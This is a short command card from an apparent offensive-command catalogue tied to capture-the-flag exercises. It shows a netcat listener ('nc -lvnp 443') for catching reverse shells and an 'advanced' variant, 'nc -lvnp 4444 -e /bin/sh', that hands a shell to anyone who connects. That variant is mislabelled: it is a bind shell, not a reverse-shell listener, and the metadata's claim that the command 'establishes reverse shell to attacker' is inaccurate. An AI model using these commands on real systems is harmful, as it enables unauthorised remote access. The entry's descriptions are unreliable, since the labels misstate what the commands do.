---
data: nc -lvnp 443
tags:
  - netcat
  - reverse-shell
type: command
output: Establishes reverse shell to attacker
executor: bash
platforms:
  - Linux
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:23:49.983Z'
id: 380652e7-dabf-4223-b72d-025716d8cd7e
verified: false
validated: true
submitted: true
---
# listen-for-reverse-shell-with-netcat

## Command

```bash
nc -lvnp 443
```

## Description

Listens on port 443 for incoming reverse shell connection from the target.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -l | Listen mode | Yes |
| -v | Verbose | Yes |
| -n | No DNS | Yes |
| -p 443 | Port to listen on | Yes |

## Examples

### Basic Usage

```bash
nc -lvnp 443
```

### Advanced Usage

```bash
nc -lvnp 4444 -e /bin/sh
```

## Expected Output

Connection from target IP; shell prompt appears.

## Related

- [[Related Procedure: Achieve-RCE-and-Read-Flag]]
